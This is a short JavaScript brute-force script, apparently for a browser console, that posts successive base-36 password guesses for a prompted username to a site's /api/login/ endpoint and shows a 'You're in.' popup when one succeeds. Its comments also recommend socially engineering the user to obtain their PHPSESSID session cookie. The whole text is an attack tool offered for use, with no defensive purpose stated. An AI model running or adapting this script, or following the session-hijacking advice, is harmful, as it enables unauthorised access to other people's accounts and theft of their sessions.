// However fast you use this script, you'll probably never get in. There are so many combos.
// Socially engineer the user to get their PHPSESSID. It has a lot of power as well.
let toforce = prompt('user to force:');
async function bruteForce() {
  for (i = parseInt("aaaaaa", 36); i++ <= parseInt("zzzzzzzzz", 36);) {
    var postData = "username=" + toforce + "&password=" + i.toString(36);
    $.post('/api/login/', postData, function(data) {
      if (data === 'SUCCESS') {
        $("body").append(`
          <div class="errorModal">
            <div class="errorPopup">
              <text class="errorText">Worked!</text>
              <text class="errorReason">You're in.</text>
            </div>
          </div>
        `);
      } else {
        // console.log('fail');
        // unmark the above line to have it log fails. not recommended due to lag.
      }
    });
    await sleep(200);
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

bruteForce();
